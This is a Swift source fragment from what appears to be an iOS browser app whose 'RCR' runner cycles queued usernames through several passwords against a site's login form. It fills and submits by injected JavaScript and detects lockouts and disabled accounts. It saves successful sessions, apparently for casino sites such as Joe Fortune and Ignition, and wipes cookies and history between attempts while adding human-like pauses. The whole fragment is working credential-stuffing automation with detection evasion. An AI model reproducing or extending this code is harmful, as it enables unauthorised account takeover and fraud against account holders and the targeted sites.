        if FillHealerEngine.fillMissed(fillResult),
           let webView = activeTab?.webView,
           let context = self.modelContext {
            let outcome = await FillHealerEngine.shared.healAndRefill(
                webView: webView,
                domain: targetDomain,
                sessionTag: "single",
                username: credential.username,
                password: password,
                modelContext: context
            )
            healedSubmitSelector = outcome?.submitSelector
        }

        rcrStatus = .submitting
        // A submit control the healer just verified beats the stored one on
        // this very attempt, not just the next visit.
        let submitScript = JavaScriptInjectionService.submitFormScript(
            submitSelector: healedSubmitSelector ?? siteSetting?.submitButtonSelector
        )
        guard let webViewForSubmit = activeTab?.webView else {
            ParkedSessionStore.shared.recordFailure()
            captureAndRecord(credential: credential, password: password, status: .failed)
            showToast("Window closed mid-submit — skipping \(credential.username)")
            advanceAfterFailure()
            return
        }
        do {
            _ = try await webViewForSubmit.evaluateJavaScript(submitScript)
        } catch {
            ParkedSessionStore.shared.recordFailure()
            captureAndRecord(credential: credential, password: password, status: .failed)
            showToast("Submit failed — skipping \(credential.username)")
            advanceAfterFailure()
            return
        }

        // Optional extra submits (sure-login). All other RCR actions are
        // gated on rcrExtraSubmitsInFlight so observation / advancement /
        // burning don't fire until these finish. The page is checked after
        // every extra submit — a permanent disable, temp-disable, or success
        // stops further submits immediately instead of continuing to hammer
        // an account that's already resolved. The speed dial scales the gap
        // between submits; the user's configured delay stays the base.
        let extraCount = max(0, UserDefaults.standard.integer(forKey: "rcrExtraSubmits"))
        let rawDelay = UserDefaults.standard.double(forKey: "rcrSubmitDelay")
        let baseDelay = rawDelay > 0 ? rawDelay : 1.5
        let delay = max(0.2, baseDelay * runSpeedProfile.submitGapMultiplier)
        if extraCount > 0 {
            // The extra-submit loop is self-driving (state check after every
            // submit) and can legitimately run for ~50s — the watchdog must
            // not fire during it. It re-arms when the loop finishes.
            cancelRCRWatchdog()
            rcrExtraSubmitsInFlight = true
            for _ in 0..<extraCount {
                await waitIfPaused()
                guard generation == rcrAttemptGeneration else { rcrExtraSubmitsInFlight = false; return }
                try? await Task.sleep(for: .seconds(delay))
                guard isRCRRunning else { rcrExtraSubmitsInFlight = false; return }
                _ = try? await activeTab?.webView?.evaluateJavaScript(submitScript)

                try? await Task.sleep(for: .seconds(0.35))
                guard isRCRRunning else { rcrExtraSubmitsInFlight = false; return }
                let rawState = try? await activeTab?.webView?.evaluateJavaScript(
                    JavaScriptInjectionService.pageStateSnapshotScript()
                )
                if let payload = JavaScriptInjectionService.parsePageState(rawState),
                   JavaScriptInjectionService.isTerminalRCRState(payload) {
                    rcrExtraSubmitsInFlight = false
                    rcrStatus = .waiting
                    handleRCRStateMessage(payload)
                    return
                }
            }
            rcrExtraSubmitsInFlight = false
        }

        credential.lastUsedAt = Date()
        credential.usageCount += 1

        // Pre-record as pending so a crash mid-attempt still leaves a trail.
        if let context = modelContext {
            _ = AttemptTrackingService.shared.recordAttempt(
                context: context,
                credentialID: credential.id,
                username: credential.username,
                password: password,
                passwordIndex: rcrPasswordIndex + 1,
                passwordTotal: rcrCurrentPasswords.count,
                targetDomain: targetDomain,
                sessionTag: "single",
                status: .pending
            )
        }

        rcrStatus = .waiting
        let installScript = JavaScriptInjectionService.rcrInstallObserverScript()
        _ = try? await activeTab?.webView?.evaluateJavaScript(installScript)
        armRCRWatchdog()
    }

    // MARK: - Run cockpit (pause / skip / retry / speed)

    /// Sets the live run-speed profile. Applies on the next attempt step
    /// (fill / submit gap / settle / judge wait) and persists for future
    /// runs. Watchdogs are rescaled the next time they arm — never shrunk
    /// below their base, only stretched for slower profiles.
    func setRunSpeedProfile(_ profile: SpeedProfile) {
        guard profile != runSpeedProfile else { return }
        runSpeedProfile = profile
        SpeedProfile.saved = profile
        showToast("Speed: \(profile.label)")
    }

    /// Pauses or resumes the run between attempts. The in-flight attempt
    /// always completes — pause takes hold before the next fill/submit.
    func setRCRPaused(_ paused: Bool) {
        guard isRCRRunning, paused != isRCRPaused else { return }
        isRCRPaused = paused
        if paused {
            // The observation watchdog must not kill an attempt while the
            // user intentionally rests; it re-arms on resume.
            cancelRCRWatchdog()
            showToast("Run paused — resumes between attempts")
        } else {
            rcrPauseContinuation?.resume()
            rcrPauseContinuation = nil
            if rcrStatus == .waiting || rcrStatus == .navigating {
                armRCRWatchdog()
            }
            showToast("Run resumed")
        }
    }

    func toggleRCRPause() {
        setRCRPaused(!isRCRPaused)
    }

    /// Suspends the runner while paused. Every async leg of the run passes
    /// through this gate between attempts.
    private func waitIfPaused() async {
        guard isRCRPaused else { return }
        await withCheckedContinuation { (continuation: CheckedContinuation<Void, Never>) in
            rcrPauseContinuation = continuation
        }
    }

    /// Skips the current credential: records it as skipped with a reason,
    /// and moves the run on to the next credential.
    func skipCurrentCredential() {
        guard isRCRRunning, rcrIndex < rcrQueueIDs.count else { return }
        cancelRCRWatchdog()
        rcrJudging = false
        rcrExtraSubmitsInFlight = false
        rcrAttemptGeneration &+= 1
        guard let credential = currentRCRCredential() else { return }
        let password = rcrCurrentPasswords[safe: rcrPasswordIndex] ?? ""
        if let context = modelContext {
            _ = AttemptTrackingService.shared.recordAttempt(
                context: context,
                credentialID: credential.id,
                username: credential.username,
                password: password,
                passwordIndex: rcrPasswordIndex + 1,
                passwordTotal: rcrCurrentPasswords.count,
                targetDomain: rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain,
                sessionTag: "single",
                status: .skipped,
                judge: SuccessJudgeEngine.Decision.local(
                    status: .skipped,
                    verdict: "skipped",
                    confidence: 1,
                    reason: "Skipped by you during the run"
                )
            )
        }
        showToast("Skipped \(credential.username)")
        persistRCRProgress(completedID: credential.id)
        rcrCompletedIDs.insert(credential.id)
        rcrIndex += 1
        rcrPasswordIndex = 0
        rcrCurrentPasswords = []
        rcrPasswordsCredentialID = ""
        if rcrIndex >= rcrTotal {
            rcrStatus = .success
            UserDefaults.standard.removeObject(forKey: rcrLastCompletedKey)
            showToast("RCR complete (\(rcrTotal)/\(rcrTotal))")
            stopRCR()
            return
        }
        Task { await runCurrentCredential() }
    }

    /// Re-fills and re-submits the password the run just tried — for pages
    /// that swallowed the first submit.
    func retryCurrentPassword() {
        guard isRCRRunning, !rcrCurrentPasswords.isEmpty,
              rcrPasswordIndex < rcrCurrentPasswords.count else { return }
        guard !rcrJudging else {
            showToast("Judging the current attempt — retry in a moment", force: true)
            return
        }
        guard rcrStatus == .waiting || rcrStatus == .submitting else {
            showToast("Retry is available while watching a submit", force: true)
            return
        }
        cancelRCRWatchdog()
        rcrJudging = false
        rcrExtraSubmitsInFlight = false
        rcrAttemptGeneration &+= 1
        showToast("Retrying \(rcrCurrentUsername)")
        Task { await attemptFill() }
    }

    // MARK: - RCR watchdog

    /// Arms the per-attempt watchdog. If the page produces no state message
    /// within the timeout (navigation failure, dead page, wedged web
    /// process), the attempt is recorded as failed and the run advances —
    /// previously the runner sat in "watching" forever. The timeout is
    /// stretched by the speed profile (slower profiles get longer windows)
    /// and never shrunk below its base.
    private func armRCRWatchdog(timeout: Duration = rcrWatchdogTimeout) {
        let effective = SpeedProfile.effectiveWatchdog(timeout, profile: runSpeedProfile)
        rcrWatchdogTask?.cancel()
        rcrWatchdogTask = Task { [weak self] in
            try? await Task.sleep(for: effective)
            guard let self, !Task.isCancelled else { return }
            self.rcrWatchdogFired()
        }
    }

    private func cancelRCRWatchdog() {
        rcrWatchdogTask?.cancel()
        rcrWatchdogTask = nil
    }

    private func rcrWatchdogFired() {
        guard isRCRRunning, rcrStatus == .waiting || rcrStatus == .navigating else { return }
        // A paused run must never be advanced by its own watchdog.
        guard !isRCRPaused else { armRCRWatchdog(); return }
        rcrAwaitingNavigation = false
        guard let credential = currentRCRCredential() else {
            rcrIndex += 1
            Task { await self.runCurrentCredential() }
            return
        }
        let password = rcrCurrentPasswords[safe: rcrPasswordIndex] ?? ""
        captureAndRecord(credential: credential, password: password, status: .failed)
        showToast("No response — skipping \(credential.username)")
        if rcrPasswordIndex + 1 < rcrCurrentPasswords.count {
            rcrPasswordIndex += 1
            Task { await self.attemptFill() }
        } else {
            persistRCRProgress(completedID: credential.id)
            rcrCompletedIDs.insert(credential.id)
            rcrIndex += 1
            rcrPasswordIndex = 0
            Task { await self.runCurrentCredential() }
        }
    }

    func rcrPageDidFinish() {
        guard isRCRRunning else { return }
        if rcrAwaitingNavigation {
            rcrAwaitingNavigation = false
            // Navigation leg completed — the navigation watchdog is no
            // longer relevant; attemptFill arms the observation watchdog.
            cancelRCRWatchdog()
            // A cookie/consent popup only ever shows up on a window's first
            // load or right after a burn+reload. After a perm-disabled burn
            // the next credential gets extra boot + consent time so the
            // login form is actually ready before we fill.
            Task {
                await self.settleThenFill()
            }
            return
        }
        // While extra submits are in flight, do nothing — the observer
        // will be installed by attemptFill() once they complete.
        if rcrExtraSubmitsInFlight { return }
        if rcrStatus == .waiting || rcrStatus == .submitting {
            activeTab?.webView?.evaluateJavaScript(
                JavaScriptInjectionService.rcrInstallObserverScript(),
                completionHandler: nil
            )
            // A reload during observation gets a fresh watchdog window so a
            // dead reload can't stall the run.
            armRCRWatchdog()
        }
    }

    func handleRCRStateMessage(_ payload: [String: Any]) {
        guard isRCRRunning, rcrStatus == .waiting else { return }
        if rcrExtraSubmitsInFlight { return }
        if rcrJudging { return }
        // NOTE: the watchdog stays armed on purpose — an actionable payload
        // advances the run (which re-arms), while a page that mutates
        // without ever resolving still needs the watchdog to fire.

        guard let credential = currentRCRCredential() else {
            rcrIndex += 1
            Task { await runCurrentCredential() }
            return
        }

        let password = rcrCurrentPasswords[safe: rcrPasswordIndex] ?? ""
        let signal = SuccessJudgeEngine.classifyLocal(payload)

        switch signal {
        case .disabled:
            applyLocalDisabled(credential: credential, password: password)
        case .tempDisabled:
            applyLocalTempDisabled(credential: credential, password: password)
        case .stillOnLogin:
            ParkedSessionStore.shared.recordFailure()
            captureAndRecord(credential: credential, password: password, status: .failed)
            advanceAfterFailure()
        case .apparentSuccess, .unclear:
            rcrJudging = true
            cancelRCRWatchdog()
            let credID = credential.id
            Task {
                await self.judgeAndAdvance(payload: payload, credentialID: credID, password: password)
                self.rcrJudging = false
            }
        }
    }

    private func applyLocalDisabled(credential: Credential, password: String) {
        ParkedSessionStore.shared.recordFailure()
        PermaDisabledStore.shared.markDisabled(credentialID: credential.id)
        captureAndRecord(credential: credential, password: password, status: .disabled)
        NeedsReviewStore.shared.flag(
            credentialID: credential.id,
            username: credential.username,
            domain: credential.domain,
            reason: "Showed as disabled during a run"
        )
        let completedID = credential.id
        Task { await burnAndAdvance(completedID: completedID) }
    }

    private func applyLocalTempDisabled(credential: Credential, password: String) {
        captureAndRecord(credential: credential, password: password, status: .tempDisabled)
        if rcrCurrentPasswords.count > 1 {
            TempDisabledStore.shared.markDisabled(credentialID: credential.id)
            showToast("Temp-disabled — \(credential.username) (1h cooldown)")
        }
        persistRCRProgress(completedID: credential.id)
        rcrCompletedIDs.insert(credential.id)
        rcrIndex += 1
        rcrPasswordIndex = 0
        Task { await runCurrentCredential() }
    }

    private func advanceAfterFailure() {
        if rcrPasswordIndex + 1 < rcrCurrentPasswords.count {
            rcrPasswordIndex += 1
            Task { await attemptFill() }
        } else if let credential = currentRCRCredential() {
            persistRCRProgress(completedID: credential.id)
            rcrCompletedIDs.insert(credential.id)
            rcrIndex += 1
            Task { await runCurrentCredential() }
        }
    }

    private func judgeAndAdvance(payload: [String: Any], credentialID: String, password: String) async {
        guard isRCRRunning else { return }
        guard let credential = currentRCRCredential(), credential.id == credentialID else { return }
        // Speed-scaled grace before judging so the page has time to settle
        // into its final state — slower profiles judge later, never sooner.
        try? await Task.sleep(for: runSpeedProfile.judgeGrace)
        guard isRCRRunning else { return }
        let webView = activeTab?.webView
        let image = await WebViewSnapshotter.capture(webView)
        let filename: String?
        if let image {
            filename = await ScreenshotStorage.save(image)
        } else {
            filename = nil
        }
        let domain = rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain
        let decision = await SuccessJudgeEngine.judge(
            payload: payload,
            image: image,
            domain: domain,
            sessionTag: "single"
        )
        recordOutcome(
            credential: credential,
            password: password,
            status: decision.status,
            image: image,
            filename: filename,
            judge: decision
        )

        switch decision.status {
        case .disabled:
            applyLocalDisabled(credential: credential, password: password)
        case .tempDisabled:
            applyLocalTempDisabled(credential: credential, password: password)
        case .failed, .pending, .skipped:
            ParkedSessionStore.shared.recordFailure()
            advanceAfterFailure()
        case .review:
            persistRCRProgress(completedID: credential.id)
            rcrCompletedIDs.insert(credential.id)
            rcrIndex += 1
            rcrPasswordIndex = 0
            Task { await runCurrentCredential() }
        case .success:
            let shouldPark = decision.shouldPark
            persistRCRProgress(completedID: credential.id)
            rcrCompletedIDs.insert(credential.id)
            rcrIndex += 1
            rcrPasswordIndex = 0
            if shouldPark {
                parkActiveTab(credential: credential, thumbnail: image)
                if rcrIndex >= rcrTotal {
                    stopRCR()
                    return
                }
                rcrAwaitingNavigation = true
                rcrStatus = .navigating
                armRCRWatchdog()
            } else {
                Task { await runCurrentCredential() }
            }
        }
    }

    private func parkActiveTab(credential: Credential, thumbnail: UIImage?) {
        guard let tab = activeTab else { return }
        let storeID = tab.dataStoreID
        // A saved login's cookie jar should only ever hold what the real
        // site set — never the diagnostics overlay's own bookkeeping cookie.
        WindowDiagnosticsService.shared.stripDiagnosticArtifacts(storeID: storeID)
        _ = ParkedSessionStore.shared.park(
            storeID: storeID,
            url: tab.webView?.url ?? tab.url,
            username: credential.username,
            domain: rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain,
            credentialID: credential.id,
            sessionTag: "single",
            thumbnail: thumbnail,
            sourceWindowIndex: 0
        )
        tab.adoptFreshStore()
        tab.url = rcrTargetURL
    }

    // MARK: - Replay Mode (Session Deck)

    /// Deck contents: frozen Joe Fortune / Ignition logins in run order, so
    /// circle 1 is the first success of the batch.
    var replayDeck: [ParkedSession] {
        ParkedSessionStore.shared.deckSessions
    }

    /// Deck button action. Entering is blocked mid-run — swapping the screen
    /// out from under a live batch would strand the runner.
    func toggleReplayMode() {
        if isReplayMode {
            exitReplayMode()
            return
        }
        guard !isRCRRunning, !quadController.anyRCRRunning else {
            showToast("Stop the run first", force: true)
            return
        }
        let deck = replayDeck
        guard !deck.isEmpty else {
            showToast("No saved logins yet — run a batch first", force: true)
            return
        }
        // A pending sure-login loop belongs to the page we're covering up.
        sureLoginTask?.cancel()
        isReplayMode = true
        // Re-open on the circle last viewed, when it's still in the deck.
        let target = deck.first { $0.id == replaySelectedID } ?? deck[0]
        loadReplaySession(target)
    }

    /// Leaves the deck and returns to the layout underneath, untouched. The
    /// frozen store is released, never burned — the circle survives.
    func exitReplayMode() {
        guard isReplayMode else { return }
        isReplayMode = false
        replayTab?.webView?.stopLoading()
        replayTab?.webView = nil
        replayTab = nil
        updateURLBar()
        resetURLBarTimer()
    }

    /// Paints a saved login across the full screen. Unlike the old restore
    /// action this leaves the parked row in place, so the circle stays and
    /// the switch is just a page load against cookies that already exist.
    func selectReplaySession(_ parked: ParkedSession) {
        guard isReplayMode, parked.id != replaySelectedID else { return }
        loadReplaySession(parked)
    }

    private func loadReplaySession(_ parked: ParkedSession) {
        replaySelectedID = parked.id
        let url = parked.url ?? Self.defaultHomeURL
        if let tab = replayTab {
            // A store swap needs a fresh WKWebView — its configuration (and
            // therefore its data store) is immutable after creation.
            tab.webView?.stopLoading()
            tab.dataStoreID = parked.storeUUID
            tab.webViewGeneration += 1
            tab.webView = nil
            tab.url = url
            tab.lastURL = url
            tab.title = parked.username
            tab.canGoBack = false
            tab.canGoForward = false
            tab.estimatedProgress = 0
        } else {
            let tab = BrowserTab(url: url, dataStoreID: parked.storeUUID)
            tab.title = parked.username
            replayTab = tab
        }
        urlBarText = url.absoluteString
        resetURLBarTimer()
    }

    /// Long-press action: wipes a saved login's cookies and its row. When the
    /// forgotten circle was on screen the deck falls through to the next one,
    /// or closes if that was the last.
    func forgetReplaySession(_ parked: ParkedSession) {
        let wasSelected = parked.id == replaySelectedID
        let remaining = replayDeck.filter { $0.id != parked.id }
        // Move off the doomed store *before* wiping it so no live web view
        // is still reading from it.
        if isReplayMode, wasSelected {
            if let next = remaining.first {
                loadReplaySession(next)
            } else {
                exitReplayMode()
            }
        }
        if replaySelectedID == parked.id { replaySelectedID = nil }
        Task { await ParkedSessionStore.shared.forget(parked) }
    }

    /// After a navigation finishes: wait for cookie/consent (and, after a
    /// burn, extra page-boot + login-form time) then start the fill. Also
    /// applies the site-smart pacing pause: the learned settle time for
    /// this domain, scaled by the live speed profile, plus a brief
    /// human-like pre-fill pause.
    private func settleThenFill() async {
        let extra = needsPostBurnSettle
        needsPostBurnSettle = false
        let settleStart = Date()
        await waitForCookieNoticeIfNeeded(extraBoot: extra)
        guard isRCRRunning else { return }
        if extra, let webView = activeTab?.webView {
            await PageSettleService.waitForLoginForm(in: webView)
            guard isRCRRunning else { return }
        }
        // Learn how long this site really took to settle (bounded EMA),
        // then rest for the profile-scaled learned time before filling.
        let domain = rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? ""
        if !domain.isEmpty {
            let observed = Date().timeIntervalSince(settleStart)
            SitePacingStore.shared.recordSettle(seconds: observed, domain: domain)
            let learned = SitePacingStore.shared.settleSeconds(for: domain)
            let scaled = SpeedProfile.scaledSettle(baseSeconds: learned, profile: runSpeedProfile)
            try? await Task.sleep(for: .seconds(scaled))
            guard isRCRRunning else { return }
            let humanPause = SitePacingStore.shared.humanPauseSeconds(for: domain)
            try? await Task.sleep(for: .seconds(humanPause))
            guard isRCRRunning else { return }
        }
        await attemptFill()
    }

    /// Waits for a cookie/consent banner to appear and be dismissed.
    /// After a burn, gives the page extra time to boot and the CMP extra
    /// time to inject before concluding there is no banner.
    private func waitForCookieNoticeIfNeeded(extraBoot: Bool) async {
        guard let webView = activeTab?.webView else { return }
        if extraBoot {
            try? await Task.sleep(for: PageSettleService.postBurnBootDelay)
            guard isRCRRunning else { return }
        }
        let grace = extraBoot ? PageSettleService.postBurnCookieGraceMs : PageSettleService.normalCookieGraceMs
        let timeout = extraBoot ? PageSettleService.postBurnCookieTimeoutMs : PageSettleService.normalCookieTimeoutMs
        _ = try? await webView.evaluateJavaScript(
            JavaScriptInjectionService.waitForCookieNoticeScript(timeoutMs: timeout, graceMs: grace)
        )
    }

    private func burnAndAdvance(completedID: String) async {
        rcrStatus = .burning
        rcrBurnFlash &+= 1
        await globalBurn()
        persistRCRProgress(completedID: completedID)
        rcrCompletedIDs.insert(completedID)
        rcrIndex += 1
        rcrPasswordIndex = 0
        needsPostBurnSettle = true

        if let target = rcrTargetURL {
            rcrStatus = .navigating
            rcrAwaitingNavigation = true
            activeTab?.url = target
            activeTab?.lastURL = target
            activeTab?.webView?.load(URLRequest(url: target))
            armRCRWatchdog(timeout: PageSettleService.postBurnNavigationWatchdog)
            return
        }
        await runCurrentCredential()
    }

    private func persistRCRProgress(completedID: String) {
        UserDefaults.standard.set(completedID, forKey: rcrLastCompletedKey)
    }

    private func globalBurn() async {
        // Single-window RCR burns only the active tab's isolated store so
        // other open tabs keep their cookies/session state.
        if let tab = activeTab {
            WindowDiagnosticsService.shared.noteBurn(tab: tab)
            await QuadDataStore.burn(dataStoreID: tab.dataStoreID)
        }

        if let context = modelContext {
            // Scope the history wipe to the RCR target site — burning a
            // session mid-run must not erase the user's entire history.
            let domain = rcrTargetURL.map { ExcludedDomain.canonicalize($0.absoluteString) } ?? ""
            if !domain.isEmpty {
                try? context.delete(
                    model: BrowsingHistoryEntry.self,
                    where: #Predicate<BrowsingHistoryEntry> { $0.domain == domain }
                )
            }
            try? context.save()
        }
        showToast("Burned cookies, cache & history")
    }

    // MARK: - Screenshot capture + record persistence

    private func recordOutcome(
        credential: Credential,
        password: String,
        status: AttemptRecord.Status,
        image: UIImage?,
        filename: String?,
        judge: SuccessJudgeEngine.Decision?
    ) {
        guard let context = modelContext else { return }
        let webView = activeTab?.webView
        _ = AttemptTrackingService.shared.recordAttempt(
            context: context,
            credentialID: credential.id,
            username: credential.username,
            password: password,
            passwordIndex: rcrPasswordIndex + 1,
            passwordTotal: rcrCurrentPasswords.count,
            targetDomain: rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain,
            sessionTag: "single",
            status: status,
            resultURL: webView?.url?.absoluteString,
            resultPageTitle: webView?.title,
            screenshotFilename: filename,
            judge: judge
        )
        let _ = image
    }

    private func captureAndRecord(
        credential: Credential,
        password: String,
        status: AttemptRecord.Status
    ) {
        guard let context = modelContext else { return }
        let webView = activeTab?.webView
        let pageURL = webView?.url?.absoluteString
        let pageTitle = webView?.title
        let targetDomain = rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain
        let pwIndex = rcrPasswordIndex + 1
        let pwTotal = rcrCurrentPasswords.count

        let credID = credential.id
        let username = credential.username

        if let webView {
            let config = WKSnapshotConfiguration()
            config.snapshotWidth = 600
            webView.takeSnapshot(with: config) { image, _ in
                guard let image else {
                    Task { @MainActor in
                        _ = AttemptTrackingService.shared.recordAttempt(
                            context: context,
                            credentialID: credID,
                            username: username,
                            password: password,
                            passwordIndex: pwIndex,
                            passwordTotal: pwTotal,
                            targetDomain: targetDomain,
                            sessionTag: "single",
                            status: status,
                            resultURL: pageURL,
                            resultPageTitle: pageTitle,
                            screenshotFilename: nil
                        )
                    }
                    return
                }
                Task { @MainActor in
                    let filename = await ScreenshotStorage.save(image)
                    let record = AttemptTrackingService.shared.recordAttempt(
                        context: context,
                        credentialID: credID,
                        username: username,
                        password: password,
                        passwordIndex: pwIndex,
                        passwordTotal: pwTotal,
                        targetDomain: targetDomain,
                        sessionTag: "single",
                        status: status,
                        resultURL: pageURL,
                        resultPageTitle: pageTitle,
                        screenshotFilename: filename
                    )
                    // We must not capture the non-Sendable ModelContext or
                    // the @Model record inside a detached task (Swift 6
                    // isolation error). Keep everything here on the main
                    // actor; `classify` hops off-actor internally for the
                    // Vision work.
                    let result = await ScreenshotOCRService.classify(image)
                    record.ocrCategory = result.category.rawValue
                    try? context.save()
                }
            }
        } else {
            _ = AttemptTrackingService.shared.recordAttempt(
                context: context,
                credentialID: credID,
                username: username,
                password: password,
                passwordIndex: pwIndex,
                passwordTotal: pwTotal,
                targetDomain: targetDomain,
                sessionTag: "single",
                status: status,
                resultURL: pageURL,
                resultPageTitle: pageTitle,
                screenshotFilename: nil
            )
        }
    }

    /// Master gate for in-app notifications. ON by default — the toasts are
    /// the only feedback channel for guard-rail messages ("Vault is empty",
    /// "Stop RCR first", …), so hiding them by default made the app look
    /// dead on a fresh install. The user can still silence status toasts in
    /// Settings; guard/error toasts pass `force: true` and always show.
    static var notificationsEnabled: Bool {
        UserDefaults.standard.object(forKey: "inAppNotifications") as? Bool ?? true
    }

    /// - Parameter force: bypasses the notifications setting. Only for
    ///   run-blocking guards and errors — status/progress toasts stay gated.
    func showToast(_ message: String, force: Bool = false) {
        guard force || Self.notificationsEnabled else { return }
        // Generation counter: an older toast's hide task must never hide a
        // newer toast that replaced it mid-display.
        toastGeneration &+= 1
        let generation = toastGeneration
        toastMessage = message
        withAnimation(.snappy) { toastVisible = true }
        Task { [weak self] in
            try? await Task.sleep(for: .seconds(2))
            guard let self, self.toastGeneration == generation else { return }
            withAnimation(.snappy) { self.toastVisible = false }
        }
    }
}

